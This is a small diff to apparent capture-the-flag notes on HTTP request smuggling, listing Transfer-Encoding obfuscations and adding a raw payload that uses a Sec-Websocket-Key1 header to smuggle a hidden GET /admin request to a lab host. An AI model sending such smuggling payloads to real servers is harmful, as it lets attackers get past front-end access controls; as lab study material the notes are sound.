@@ -85,6 +85,19 @@ Host: tecl.htb
 | Horizontal Tab       | Transfer-Encoding:[\x09]chunked |
 | Vertical Tab         | Transfer-Encoding:[\x0b]chunked |
 | Leading space        | Transfer-Encoding: chunked      |
+Try
+
+Sec-Websocket-Key1: x
+it tells the server the body is 8 bytes only of x and CL is correct so 
+
+GET / HTTP/1.1
+Host: 154.57.164.66:30368
+Content-Length: 62
+Sec-Websocket-Key1: x
+
+xxxxxxxxGET /admin HTTP/1.1
+Host:154.57.164.66:30368
+dummy:
 
 ---
 
